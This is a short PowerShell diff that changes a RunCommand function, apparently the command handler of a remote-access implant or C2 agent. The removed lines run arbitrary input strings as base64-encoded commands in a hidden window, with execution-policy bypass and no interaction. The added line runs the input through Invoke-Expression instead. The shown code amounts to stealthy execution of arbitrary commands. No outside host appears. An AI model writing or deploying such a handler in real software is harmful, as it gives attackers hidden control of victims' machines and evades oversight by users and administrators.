@@ -61,10 +61,10 @@ function RunCommand {
     if ($inputStr -like "Terminate") {
         exit
     }
-    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
-    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($inputStr))
-    return  powershell -exec bypass -Noninteractive -windowstyle hidden -e  $EncodedPayloadScript | Out-String
-    
+    # $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+    # $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($inputStr))
+    # return  powershell -exec bypass -Noninteractive -windowstyle hidden -e  $EncodedPayloadScript | Out-String
+    return Invoke-Expression $inputStr | Out-String
 
 }
 # end internal function
